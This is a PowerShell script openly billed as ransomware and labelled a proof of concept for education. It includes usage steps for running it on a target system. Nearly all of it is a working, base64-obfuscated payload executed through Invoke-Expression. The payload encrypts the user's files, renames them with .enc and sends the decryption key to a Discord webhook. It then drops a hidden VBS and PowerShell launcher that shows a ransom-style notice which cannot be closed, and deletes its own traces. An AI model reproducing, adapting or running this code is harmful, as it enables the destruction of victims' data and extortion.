<#=================================================== Beigeworm's File Encryptor (Base64) =======================================================

SYNOPSIS
This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
with a notice to the user.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

THIS IS EFFECTIVELY RANSOMWARE - I CANNOT TAKE RESPONSIBILITY FOR LOST FILES!
DO NOT USE THIS ON ANY CRITICAL SYSTEMS OR SYSTEMS WITHOUT PERMISSION
THIS IS A PROOF OF CONCEPT TO WRITE RANSOMWARE IN POWERSHELL AND IS FOR EDUCATIONAL PURPOSES

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Enter your webhook below. (if not pre-defined in a stager file or duckyscript etc)
2. Run the script on target system.
3. Check Discord for the Decryption Key.
4. Use the decryptor to decrypt the files.

CREDIT
Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
https://youtu.be/IwfoHN2dWeE
#>

$dc = 'YOUR_WEBHOOK_HERE' # (Remove this line if $dc is pre-defined elseware)
$b64 = "JEhpZGVXaW5kb3cgPSAxDQpJZiAoJEhpZGVXaW5kb3cgLWd0IDApew0KJEltcG9ydCA9ICdbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhpbnQgaGFuZGxlLCBpbnQgc3RhdGUpOyc7DQphZGQtdHlwZSAtbmFtZSB3aW4gLW1lbWJlciAkSW1wb3J0IC1uYW1lc3BhY2UgbmF0aXZlOw0KW25hdGl2ZS53aW5dOjpTaG93V2luZG93KChbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHwgR2V0LVByb2Nlc3MpLk1haW5XaW5kb3dIYW5kbGUsIDApOw0KfQ0KJHdodXJpID0gIiRkYyINCiRTb3VyY2VGb2xkZXIgPSAiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wIiAjLCIkZW52OlVTRVJQUk9GSUxFXERvY3VtZW50cyIsIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzIiwiJGVudjpVU0VSUFJPRklMRVxPbmVEcml2ZSINCiRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJFNvdXJjZUZvbGRlciAtRmlsZSAtUmVjdXJzZQ0KJGluZGljYXRvciA9ICIkZW52OnRtcC9pbmRpY2F0ZSINCmlmICghKFRlc3QtUGF0aCAtUGF0aCAkaW5kaWNhdG9yKSl7DQoiaW5kaWNhdGUiIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRpbmRpY2F0b3IgLUFwcGVuZA0KfWVsc2V7DQpleGl0DQp9DQokQ3VzdG9tSVYgPSAncjdTYlRmZlRNYk1BNFptNzBpSEF3QT09Jw0KJEtleSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpDQokS2V5LkdlbmVyYXRlS2V5KCkNCiRJVkJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkQ3VzdG9tSVYpDQokS2V5LklWID0gJElWQnl0ZXMNCiRLZXlCeXRlcyA9ICRLZXkuS2V5DQokS2V5U3RyaW5nID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEtleUJ5dGVzKQ0KIkRlY3J5cHRpb24gS2V5OiAkS2V5U3RyaW5nIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkZW52OnRtcC9rZXkubG9nIC1BcHBlbmQNCiRib2R5ID0gQHsidXNlcm5hbWUiID0gIiRlbnY6Q09NUFVURVJOQU1FIiA7ImNvbnRlbnQiID0gIkRlY3J5cHRpb24gS2V5OiAkS2V5U3RyaW5nIn0gfCBDb252ZXJ0VG8tSnNvbg0KSVJNIC1VcmkgJHdodXJpIC1NZXRob2QgUG9zdCAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iIC1Cb2R5ICRib2R5DQpHZXQtQ2hpbGRJdGVtIC1QYXRoICRTb3VyY2VGb2xkZXIgLUZpbGUgLVJlY3Vyc2UgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgJEZpbGUgPSAkXw0KICAgICRFbmNyeXB0b3IgPSAkS2V5LkNyZWF0ZUVuY3J5cHRvcigpDQogICAgJENvbnRlbnQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJEZpbGUuRnVsbE5hbWUpDQogICAgJEVuY3J5cHRlZENvbnRlbnQgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJENvbnRlbnQsIDAsICRDb250ZW50Lkxlbmd0aCkNCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRGaWxlLkZ1bGxOYW1lLCAkRW5jcnlwdGVkQ29udGVudCkNCn0NCmZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykgew0KICAgICRuZXdOYW1lID0gJGZpbGUuTmFtZSArICIuZW5jIg0KICAgICRuZXdQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRTb3VyY2VGb2xkZXIgLUNoaWxkUGF0aCAkbmV3TmFtZQ0KICAgIFJlbmFtZS1JdGVtIC1QYXRoICRmaWxlLkZ1bGxOYW1lIC1OZXdOYW1lICRuZXdOYW1lDQp9DQokVG9GaWxlID0gQCcNCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiRmdWxsTmFtZSA9IChHZXQtV21pT2JqZWN0IFdpbjMyX1VzZXJBY2NvdW50IC1GaWx0ZXIgIk5hbWUgPSAnJEVudjpVc2VyTmFtZSciKS5GdWxsTmFtZQ0KJGZvcm0gPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuRm9ybQ0KJGZvcm0uVGV4dCA9ICIgICoqWU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEISoqIg0KJGZvcm0uRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxMixzdHlsZT1Cb2xkJw0KJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgRHJhd2luZy5TaXplKDgwMCwgNjAwKQ0KJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICdDZW50ZXJTY3JlZW4nDQokZm9ybS5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpCbGFjaw0KJGZvcm0uRm9ybUJvcmRlclN0eWxlID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm1Cb3JkZXJTdHlsZV06OkZpeGVkRGlhbG9nDQokZm9ybS5Db250cm9sQm94ID0gJGZhbHNlDQokZm9ybS5Ub3BNb3N0ID0gJHRydWUNCiRmb3JtLkZvbnQgPSAnTWljcm9zb2Z0IFNhbnMgU2VyaWYsMTIsc3R5bGU9Ym9sZCcNCiRmb3JtLkZvcmVDb2xvciA9ICIjRkYwMDAwIg0KDQokdGl0bGUgPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuTGFiZWwNCiR0aXRsZS5UZXh0ID0gIiBfX19fX2BuIC8gJycnICAgJycnIFwgYG58JyAnKCkgKCknICd8IGBuIFwnJyAgXiAgJycvIGBuICAgfHx8fHx8fHwgIGBuICAgfHx8fHx8fHwiDQokdGl0bGUuRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxNCcNCiR0aXRsZS5BdXRvU2l6ZSA9ICR0cnVlDQokdGl0bGUuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDMzMCwgMjApDQoNCiRsYWJlbCA9IE5ldy1PYmplY3QgV2luZG93cy5Gb3Jtcy5MYWJlbA0KaWYgKCRmdWxsTmFtZS5MZW5ndGggLW5lIDApew0KICAgICRsYWJlbC5UZXh0ID0gIkhlbGxvICRmdWxsTmFtZSEgWW91ciBGaWxlcyBIYXZlIEJlZW4gRU5DUllQVEVELiINCn1lbHNlew0KICAgICRsYWJlbC5UZXh0ID0gIkhlbGxvIFVzZXIhIFlvdXIgRmlsZXMgSGF2ZSBCZWVuIEVOQ1JZUFRFRC4iDQp9DQokbGFiZWwuRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxOCxzdHlsZT1VbmRlcmxpbmUsYm9sZCcNCiRsYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQokbGFiZWwuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDYwLCAyMDApDQoNCiRsYWJlbDIgPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuTGFiZWwNCiRsYWJlbDIuVGV4dCA9ICIgVG8gcmVjb3ZlciB5b3VyIGZpbGVzIHlvdSB3aWxsIG5lZWQgdGhlIERlY3J5cHRpb24gS2V5IGBuYG5gbiBSdW4gdGhlIERlY3J5cHRvciBzY3JpcHQgYW5kIGVudGVyIHRoZSBrZXkgdG8gcmVjb3ZlciBmaWxlcyBgbmBuYG4gWW91IGNhbiBjbG9zZSB0aGlzIHdpbmRvdyB3aGVuIERlY3J5cHRpb24gaXMgY29tcGxldGUgYG5gbmBuIFdyaXR0ZW4gYnkgQGJlaWdld29ybSAtIEZvbGxvdyBvbiBHaXRodWIgLSBEaXNjb3JkIDogZWdpZWIiDQokbGFiZWwyLkF1dG9TaXplID0gJHRydWUNCiRsYWJlbDIuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDYwLCAyODApDQoNCiRidXR0b24gPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuQnV0dG9uDQokYnV0dG9uLlRleHQgPSAiQ2xvc2UiDQokYnV0dG9uLldpZHRoID0gMTIwDQokYnV0dG9uLkhlaWdodCA9IDM1DQokYnV0dG9uLkJhY2tDb2xvciA9IFtTeXN0ZW0uRHJhd2luZy5Db2xvcl06OldoaXRlDQokYnV0dG9uLkZvcmVDb2xvciA9IFtTeXN0ZW0uRHJhd2luZy5Db2xvcl06OkJsYWNrDQokYnV0dG9uLkRpYWxvZ1Jlc3VsdCA9IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5EaWFsb2dSZXN1bHRdOjpPSw0KJGJ1dHRvbi5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoNjYwLCA1MjApDQokYnV0dG9uLkZvbnQgPSAnTWljcm9zb2Z0IFNhbnMgU2VyaWYsMTIsc3R5bGU9Qm9sZCcNCg0KJGZvcm0uQ29udHJvbHMuQWRkUmFuZ2UoQCgkdGl0bGUsJGxhYmVsLCRsYWJlbDIsJGJ1dHRvbikpDQoNCiRyZXN1bHQgPSAkZm9ybS5TaG93RGlhbG9nKCkNCldoaWxlIChUZXN0LVBhdGggLVBhdGggJGVudjp0bXAvaW5kaWNhdGUpe2lmKCRyZXN1bHQgLWVxIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5EaWFsb2dSZXN1bHRdOjpPSyl7JGZvcm0uU2hvd0RpYWxvZygpfX0NCidADQokVG9WYnMgPSBAJw0KU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCm9ialNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXhlYyBCeXBhc3MgLVcgSGlkZGVuIC1GaWxlICIiJXRlbXAlXHdpbi5wczEiIiIsIDAsIFRydWUNCidADQokVG9GaWxlIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRlbnY6dG1wL3dpbi5wczEgLUFwcGVuZA0KJFZic1BhdGggPSAiJGVudjp0bXBcc2VydmljZS52YnMiDQokVG9WYnMgfCBPdXQtRmlsZSAtRmlsZVBhdGggJFZic1BhdGggLUZvcmNlDQomICRWYnNQYXRoDQpzbGVlcCAxDQpybSAtUGF0aCAkVmJzUGF0aCAtRm9yY2UNCnJtIC1QYXRoICIkZW52OnRtcFx3aW4ucHMxIiAtRm9yY2U="
$loadb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
Invoke-Expression $loadb64
